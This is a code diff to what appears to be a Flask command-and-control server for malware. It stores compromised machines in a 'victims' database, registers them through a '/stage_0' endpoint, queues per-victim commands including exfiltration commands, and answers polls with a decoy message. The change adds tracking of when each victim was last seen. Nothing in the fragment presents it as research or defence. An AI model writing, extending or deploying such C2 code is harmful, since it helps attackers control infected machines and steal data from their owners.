@@ -5,6 +5,7 @@ import pymongo
 import logging
 import pdb
 import base64
+import datetime
 
 def main(myclient):
 	app = Flask('app')
@@ -15,6 +16,12 @@ def main(myclient):
 			return base64.b64decode(d.to_dict()['session']).decode()
 		else:
 			return False
+
+	def update_last_seen(mydb,victim_id):
+		victims = mydb["victims"]
+		h = {'id':victim_id}
+		victims.find_one_and_update(h,{ "$set": { "lastseen": datetime.datetime.now() } })
+
 
 	def get_victim_info(request):
 		return request.form.to_dict()
@@ -33,12 +40,13 @@ def main(myclient):
 					cmds.delete_one(x)
 					x = cmds.find_one()
 
-				if 'command' in x and x['victim_id'] == victim_id:
+				elif 'command' in x and x['victim_id'] == victim_id:
 					cmd = x['command']
 					cmds.delete_one(x)
 					return "Exfiltration command detected"
 
-
+			if victim_id:
+				update_last_seen(mydb,victim_id)
 
 			return 'Nothing Fishy going on here :)'
 		if request.method == 'POST':
@@ -56,6 +64,9 @@ def main(myclient):
 			f.close()
 			return "OK"
 
+
+		
+
 	@app.route('/stage_0',methods = ['POST'])
 	def stage():
 		if request.method == 'POST':
@@ -71,6 +82,7 @@ def main(myclient):
 			h.update(info)
 
 			if not victims.find_one(h):
+				h['lastseen'] = datetime.datetime.now()
 				victims.insert_one(h)
 				return ('Victim registered', 200)
 			else:
